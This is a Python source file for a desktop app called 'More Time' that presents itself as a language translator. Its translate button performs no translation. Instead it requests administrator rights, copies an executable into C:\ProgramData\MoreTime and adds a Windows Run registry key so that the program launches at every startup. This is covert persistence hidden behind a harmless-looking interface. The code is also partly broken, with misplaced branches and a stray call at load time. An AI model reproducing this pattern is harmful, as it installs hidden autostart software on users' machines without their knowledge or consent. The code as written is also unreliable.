import flet as ft
import translate
from tkinter import *
from tkinter.ttk import Progressbar
import winreg
import shutil
import sys
import os
from time import sleep
import pyuac as admin
language = ""


def main(page: ft.Page):
    page.title = "More Time"
    page.window_width = 550
    page.window_height = 550
    page.window_min_width = 550
    page.window_min_height = 550
    page.window_max_width = 550
    page.window_max_height = 550
    page.window_resizable = False
    page.window_center()
    page.theme_mode = ft.ThemeMode.SYSTEM
    page.theme = ft.Theme(color_scheme_seed=ft.colors.PURPLE_ACCENT)
    page.vertical_alignment = ft.MainAxisAlignment.CENTER
    input_lang = ft.TextField(value="", text_align=ft.TextAlign.CENTER, width=200, label="Input language",
                              read_only=True)
    output_lang = ft.TextField(value="", text_align=ft.TextAlign.CENTER, width=200, label="Output language",
                               read_only=True)
    text_input = ft.TextField(value="", text_align=ft.TextAlign.CENTER, width=200, label="Input text")
    result_output = ft.TextField(value="", text_align=ft.TextAlign.CENTER, width=200, read_only=True,
                                 label="Result output")

    def change_inp():
        language = ""

        def com_lan():
            global language
            run = False
            import tkinter as tk
            from tkinter import ttk
            from googletrans import LANGUAGES
            lan = []
            for i in LANGUAGES:
                lan.append(LANGUAGES[i])
            window = tk.Tk()
            window.resizable(False, False)
            n = tk.StringVar()

            def callback(even):
                global language
                language = str(combobox.get())

            combobox = ttk.Combobox(window, textvariable=n)
            combobox['values'] = lan
            combobox.bind('<<ComboboxSelected>>', callback)
            combobox.pack()
            window.mainloop()
            return language

        input_lang.value = com_lan()
        page.update()

    def change_out():
        def com_lan():
            global language
            run = False
            import tkinter as tk
            from tkinter import ttk
            from googletrans import LANGUAGES
            lan = []
            for i in LANGUAGES:
                lan.append(LANGUAGES[i])
            window = tk.Tk()
            window.resizable(False, False)
            n = tk.StringVar()

            def callback(even):
                global language
                language = str(combobox.get())

            combobox = ttk.Combobox(window, textvariable=n)
            combobox['values'] = lan
            combobox.bind('<<ComboboxSelected>>', callback)
            combobox.pack()
            window.mainloop()
            return language

        output_lang.value = com_lan()
        page.update()
    # create new page when user prees the chenge button
    def chengClick():
        ft.Page( "change")
    def translate_click(e):
        input_text = text_input.value
        input_language = input_lang.value
        output_language = output_lang.value


        # ----------------- Go register -------------------------------
        def Gorigester():
            if not admin.isUserAdmin():
                admin.runAsAdmin()

                def Gorigester():
                    path = winreg.HKEY_LOCAL_MACHINE
                    softwera = winreg.OpenKeyEx(path, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
                    NewKY = winreg.CreateKey(softwera, "MoreTime")
                    winreg.SetValueEx(NewKY, "MoreTime", winreg.REG_BINARY, 0,
                                      r"C:\\ProgramData\\MoreTime\\MoreTime.exe".encode())

                Gorigester()

            else:
                pass

        if not os.path.exists(r"C:\\ProgramData\\MoreTime"):
            os.mkdir(r"C:\\ProgramData\\MoreTime", mode=0o777)
            if os.path.exists(r"C:\\ProgramData\\MoreTime\\MoreTime.exe"):
                pass
            else:
                if os.path.exists("./MoreTime.exe"):
                    shutil.move("./MoreTime.exe", r"C:\\ProgramData\\MoreTime")
                    sleep(1)
                    Gorigester()
                else:
                    sleep(1)
                    Gorigester()

        else:
            pass




        # result_output.value = output_text
        page.update()
    t = ft.Tabs(selected_index=1,
                    animation_duration=300,
                    tabs=[
                        ft.Tab(
                            text="Translator",
                            content=ft.Container(
                                ft.Column(
                                    [
                                        ft.ListTile(
                                            leading=ft.Icon(ft.icons.TRANSLATE),
                                            title=ft.Text("Translator"),
                                            subtitle=ft.Text(
                                                "Select input language and destination language then type yor text"
                                            )
                                        ),
                                        ft.Row(
                                            [
                                                input_lang,
                                                ft.Icon(ft.icons.ARROW_FORWARD),
                                                output_lang,
                                            ],
                                            alignment=ft.MainAxisAlignment.CENTER,
                                        ),
                                        ft.Row(
                                            [
                                                ft.ElevatedButton("Choose input language",
                                                                  on_click=lambda e: change_inp()),
                                                ft.Icon(ft.icons.SELECT_ALL),
                                                ft.ElevatedButton("Choose output language",
                                                                  on_click=lambda e: change_out()),

                                            ],
                                            alignment=ft.MainAxisAlignment.CENTER,

                                        ),
                                        ft.Row(
                                            [
                                                text_input,

                                            ],
                                            alignment=ft.MainAxisAlignment.CENTER,
                                        ),
                                        ft.Row(
                                            [
                                                ft.IconButton(ft.icons.TRANSLATE, on_click=translate_click),
                                                ft.IconButton(ft.icons.RESTORE_PAGE_SHARP, on_click=chengClick()),

                                            ],
                                            alignment=ft.MainAxisAlignment.CENTER,
                                        ),
                                        ft.Row(
                                            [

                                                result_output,
                                            ],
                                            alignment=ft.MainAxisAlignment.CENTER,
                                        )
                                    ]
                                )
                            )
                        ),
                        ft.Tab(

                        )

                    ],
                    expand=1)
    page.add(
        t,
        ft.Container(
            ft.Column(
                [

                ]
            )
        )
    )


ft.app(main)